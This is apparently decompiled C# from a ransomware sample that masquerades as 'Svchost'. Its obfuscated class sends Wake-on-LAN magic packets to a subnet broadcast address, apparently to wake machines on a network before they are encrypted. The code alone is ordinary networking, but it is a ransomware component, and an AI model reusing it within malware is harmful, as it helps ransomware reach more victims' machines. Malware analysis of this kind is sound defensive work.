// Decompiled with JetBrains decompiler
// Type: qYAjLWajCJpnf.UgWbNbXiAr
// Assembly: Svchost, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F9AAAE71-E61A-4958-B1A7-6590C53648E2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.Win32.Generic-8c723af5c826adea162ef3f2e37a1cca7b43d549c9a5fab7c9ff17f65eb5d8e7.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;

namespace qYAjLWajCJpnf
{
  public static class UgWbNbXiAr
  {
    [NonSerialized]
    internal static GetString \u007F;

    public static void DFKdxLDXAiHMP([In] string obj0, [In] string obj1, [In] string obj2)
    {
      UdpClient udpClient = new UdpClient();
      byte[] dgram = new byte[102];
      for (int index = 0; index <= 5; ++index)
        dgram[index] = byte.MaxValue;
      string[] strArray;
      if (obj0.Contains(UgWbNbXiAr.\u007F(107457667)))
        strArray = obj0.Split('-');
      else
        strArray = obj0.Split(':');
      if (strArray.Length != 6)
        throw new ArgumentException(UgWbNbXiAr.\u007F(107457662));
      int num = 6;
      for (int index1 = 0; index1 < 16; ++index1)
      {
        for (int index2 = 0; index2 < 6; ++index2)
          dgram[num + index1 * 6 + index2] = (byte) Convert.ToInt32(strArray[index2], 16);
      }
      IPAddress broadcastAddress = IPAddress.Parse(obj1).GetBroadcastAddress(IPAddress.Parse(obj2));
      udpClient.Send(dgram, dgram.Length, broadcastAddress.ToString(), 3);
    }

    public static IPAddress GetBroadcastAddress([In] this IPAddress obj0, [In] IPAddress obj1)
    {
      byte[] addressBytes1 = obj0.GetAddressBytes();
      byte[] addressBytes2 = obj1.GetAddressBytes();
      if (addressBytes1.Length != addressBytes2.Length)
        throw new ArgumentException(UgWbNbXiAr.\u007F(107457585));
      byte[] address = new byte[addressBytes1.Length];
      for (int index = 0; index < address.Length; ++index)
        address[index] = (byte) ((uint) addressBytes1[index] | (uint) addressBytes2[index] ^ (uint) byte.MaxValue);
      return new IPAddress(address);
    }

    static UgWbNbXiAr() => Strings.CreateGetStringDelegate(typeof (UgWbNbXiAr));
  }
}
